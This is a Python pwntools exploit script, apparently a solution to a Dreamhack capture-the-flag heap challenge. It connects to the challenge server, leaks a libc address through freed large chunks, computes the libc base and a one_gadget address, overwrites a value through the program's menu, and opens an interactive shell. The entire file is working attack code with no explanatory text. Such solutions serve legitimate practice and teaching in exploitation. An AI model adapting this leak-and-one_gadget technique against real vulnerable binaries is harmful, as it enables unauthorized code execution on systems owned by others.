from pwn import *
from pwn import u64

import warnings
warnings.filterwarnings( 'ignore' )   

p = remote("host3.dreamhack.games",22780)
l = ELF('./a/libc-2.27.so')
arena_offset = l.symbols['__malloc_hook'] + 0x10

def human(weight, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(weight))
    p.sendlineafter(": ", str(age))
    
def robot(weight):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(weight))
    
def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))

custom(0x500, "AAAA", 100)
custom(0x500, "AAAA", 100)
custom(0x500, "AAAA", 0)
custom(0x500, "B", 100)

success("main_arena_offset : "+hex(arena_offset))

lb = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebc42
og = lb + 0x10a41c

success("libc_base : "+hex(lb))
success("one_gadget : "+hex(og))

human("1", og)
robot("1")

p.interactive()